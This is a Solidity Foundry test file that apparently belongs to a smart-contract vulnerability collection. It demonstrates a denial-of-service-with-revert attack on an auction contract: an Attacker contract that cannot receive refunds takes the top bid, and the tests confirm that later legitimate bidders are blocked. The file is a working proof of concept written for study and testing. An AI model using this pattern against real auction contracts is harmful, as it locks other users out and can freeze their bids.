// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableContract} from "../../src/DOS/DoSWithRevert.sol";

contract Attacker {
    VulnerableContract public vuln;

    constructor(address _vuln) {
        vuln = VulnerableContract(_vuln);
    }

    function attack() external payable {
        vuln.bid{value: msg.value}();
    }

}
contract VulnerableContractPoC is Test {
    VulnerableContract vuln;
    Attacker attacker;
    address legitimateUser = makeAddr("legitimateUser");

    function setUp() public {
        vuln = new VulnerableContract();
        attacker = new Attacker(address(vuln));
        vm.deal(legitimateUser, 10 ether); 
    }

    function test_DenialOfServiceViaFailedRefund() public {
        vm.deal(address(attacker), 1 ether);
        attacker.attack{value: 1 ether}();

        assertEq(vuln.highestBidder(), address(attacker));
        assertEq(vuln.highestBid(), 1 ether);

        vm.expectRevert("Refund failed");
        vm.prank(legitimateUser);
        vuln.bid{value: 2 ether}();

        assertEq(vuln.highestBidder(), address(attacker));
        assertEq(vuln.highestBid(), 1 ether);
    }

    function test_MultipleLegitimateUsersBlocked() public {
        vm.deal(address(attacker), 1 ether);
        attacker.attack{value: 1 ether}();

        for (uint256 i = 0; i < 3; i++) {
            address user = makeAddr(string(abi.encodePacked("user", i)));
            vm.deal(user, 2 ether + i);
            vm.prank(user);
            
            vm.expectRevert("Refund failed");
            vuln.bid{value: 2 ether + i}();
        }

        assertEq(vuln.highestBidder(), address(attacker));
    }

    function test_NormalOperationWhenRefundWorks() public {
        address user1 = makeAddr("user1");
        address user2 = makeAddr("user2");
        
        vm.deal(user1, 1 ether);
        vm.prank(user1);
        vuln.bid{value: 1 ether}();
        
        vm.deal(user2, 2 ether);
        vm.prank(user2);
        vuln.bid{value: 2 ether}();
        
        // Should work normally
        assertEq(vuln.highestBidder(), user2);
        assertEq(vuln.highestBid(), 2 ether);
    }
}